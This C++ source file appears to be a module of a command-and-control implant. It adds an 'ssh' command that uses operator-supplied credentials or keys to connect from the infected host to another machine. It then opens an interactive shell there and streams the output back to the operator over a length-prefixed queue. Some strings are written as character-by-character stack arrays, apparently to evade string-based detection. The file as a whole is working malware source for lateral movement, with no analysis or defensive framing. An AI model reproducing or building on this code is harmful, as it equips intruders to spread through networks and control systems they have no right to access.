#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <ssh_client.h>

#ifdef INCLUDE_CMD_SSH

using namespace stardust;
using namespace starburst;

static void queue_interactive_output(instance& inst, const char* task_uuid,
    const uint8_t* data, uint32_t data_len, uint8_t msg_type)
{
    // Wire format: [task_uuid(36)][msg_type(1)][data_len(4)][data]
    uint32_t entry_size = 36 + 1 + 4 + data_len;
    uint32_t needed = inst.interactive_queue.length + 4 + entry_size;

    if (needed > inst.interactive_queue.capacity) {
        uint32_t nc = inst.interactive_queue.capacity == 0 ? 4096 : inst.interactive_queue.capacity;
        while (nc < needed) nc *= 2;
        inst.interactive_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc(inst.interactive_queue.buffer, nc));
        inst.interactive_queue.capacity = nc;
    }

    auto qb = inst.interactive_queue.buffer + inst.interactive_queue.length;

    // 4-byte length prefix
    qb[0] = (entry_size >> 24) & 0xFF;
    qb[1] = (entry_size >> 16) & 0xFF;
    qb[2] = (entry_size >> 8)  & 0xFF;
    qb[3] = entry_size & 0xFF;
    qb += 4;

    // task UUID (36 bytes)
    memory::copy(qb, (void*)task_uuid, 36);
    qb += 36;

    // message type
    *qb++ = msg_type;

    // data length + data
    qb[0] = (data_len >> 24) & 0xFF;
    qb[1] = (data_len >> 16) & 0xFF;
    qb[2] = (data_len >> 8)  & 0xFF;
    qb[3] = data_len & 0xFF;
    qb += 4;
    if (data_len > 0)
        memory::copy(qb, (void*)data, data_len);

    inst.interactive_queue.length += 4 + entry_size;
}

auto declfn starburst::cmd_ssh(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto hostname = parser_string(params, &host_len);
    uint32_t port = parser_int32(params);
    uint32_t user_len = 0;
    auto username = parser_string(params, &user_len);
    uint32_t cred_len = 0;
    auto credential = parser_string(params, &cred_len);
    uint32_t key_len = 0;
    auto key_data = (const uint8_t*)parser_string(params, &key_len);

    if (!hostname || host_len == 0 || !username || user_len == 0) {
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("missing hostname or username")));
        return;
    }

    char host_buf[256] = {};
    char user_buf[128] = {};
    char cred_buf[256] = {};
    if (host_len >= 256) host_len = 255;
    if (user_len >= 128) user_len = 127;
    if (cred_len >= 256) cred_len = 255;
    memory::copy(host_buf, hostname, host_len);
    memory::copy(user_buf, username, user_len);
    if (credential && cred_len > 0)
        memory::copy(cred_buf, credential, cred_len);

    if (port == 0) port = 22;

    // Connect
    int32_t sess_idx = ssh_connect(inst, host_buf, (uint16_t)port, user_buf, cred_buf,
        key_data, key_len);
    if (sess_idx < 0) {
        const char* err = ssh_last_error(inst);
        if (err) {
            char err_msg[384] = {};
            char prefix[] = { 'S','S','H',' ','c','o','n','n','e','c','t',' ','f','a','i','l','e','d',':',' ', 0 };
            uint32_t plen = str_len(prefix);
            memory::copy(err_msg, prefix, plen);
            uint32_t elen = str_len(err);
            if (elen > 360) elen = 360;
            memory::copy(err_msg + plen, (void*)err, elen);
            queue_response(inst, task_uuid, RESPONSE_ERROR, err_msg);
        } else {
            queue_response(inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>(const_cast<char*>("SSH connection failed")));
        }
        return;
    }

    // Open interactive shell
    if (!ssh_shell_open(inst, (uint32_t)sess_idx)) {
        const char* err = ssh_last_error(inst);
        char err_msg[384] = {};
        char prefix[] = { 'S','h','e','l','l',' ','o','p','e','n',' ','f','a','i','l','e','d',':',' ', 0 };
        uint32_t plen = str_len(prefix);
        memory::copy(err_msg, prefix, plen);
        if (err) {
            uint32_t elen = str_len(err);
            if (elen > 360) elen = 360;
            memory::copy(err_msg + plen, (void*)err, elen);
        }
        ssh_disconnect(inst, (uint32_t)sess_idx);
        queue_response(inst, task_uuid, RESPONSE_ERROR, err_msg);
        return;
    }

    // Register interactive session
    bool registered = false;
    for (uint32_t i = 0; i < inst.MAX_INTERACTIVE_SESSIONS; i++) {
        if (!inst.interactive_sessions[i].active) {
            memory::copy(inst.interactive_sessions[i].task_uuid, task_uuid, 36);
            inst.interactive_sessions[i].task_uuid[36] = 0;
            inst.interactive_sessions[i].ssh_session_idx = (uint32_t)sess_idx;
            inst.interactive_sessions[i].active = true;
            registered = true;
            break;
        }
    }

    if (!registered) {
        ssh_disconnect(inst, (uint32_t)sess_idx);
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("no free interactive session slot")));
        return;
    }

    // Send initial output message with connection info
    char result[512] = {};
    char msg[] = { 'C','o','n','n','e','c','t','e','d',' ','t','o',' ', 0 };
    uint32_t roff = 0;
    uint32_t mlen = str_len(msg);
    memory::copy(result + roff, msg, mlen); roff += mlen;
    memory::copy(result + roff, user_buf, str_len(user_buf)); roff += str_len(user_buf);
    result[roff++] = '@';
    memory::copy(result + roff, host_buf, str_len(host_buf)); roff += str_len(host_buf);
    result[roff++] = ':';
    char port_str[8] = {};
    int_to_str(port_str, port, 10);
    memory::copy(result + roff, port_str, str_len(port_str)); roff += str_len(port_str);
    result[roff++] = '\n';
    result[roff] = 0;

    queue_interactive_output(inst, task_uuid,
        (const uint8_t*)result, roff, INTERACTIVE_OUTPUT);

    // Task stays alive - RESPONSE_PROCESSING keeps it open
    queue_response(inst, task_uuid, RESPONSE_PROCESSING,
        symbol<char*>(const_cast<char*>("")));
}

#endif
